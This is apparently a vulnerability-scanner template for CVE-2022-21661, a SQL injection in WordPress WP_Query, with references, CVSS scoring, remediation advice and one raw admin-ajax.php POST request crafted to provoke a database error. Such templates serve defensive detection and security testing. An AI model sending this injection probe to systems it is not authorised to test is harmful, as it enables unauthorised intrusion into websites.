id: CVE-2022-21661

info:
  name: WordPress Core 5.8.3 <= 'WP_Query' - SQL Injection
  author: Marcio Mendes
  severity: high
  description: |
    Due to improper sanitization in WP_Query, there can be cases where SQL injection is possible through plugins or themes that use it in a certain way.
  reference:
    - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
    - https://www.zerodayinitiative.com/blog/2022/1/18/cve-2021-21661-exposing-database-info-via-wordpress-sql-injection
    - http://packetstormsecurity.com/files/165540/WordPress-Core-5.8.2-SQL-Injection.html
    - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
  remediation: This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-21661
    cwe-id: CWE-89
  metadata:
    verified: "true"
  tags: wp,sqli,wpquery,wpscan,packetstorm,cve,cve2022,wordpress

requests:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=ecsload&query={"tax_query":{"0":{"field":"term_taxonomy_id","terms":[""]}}}&ecs_ajax_settings={"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "WordPress database error:")'
          - 'contains(body, "error in your SQL syntax")'
        condition: and
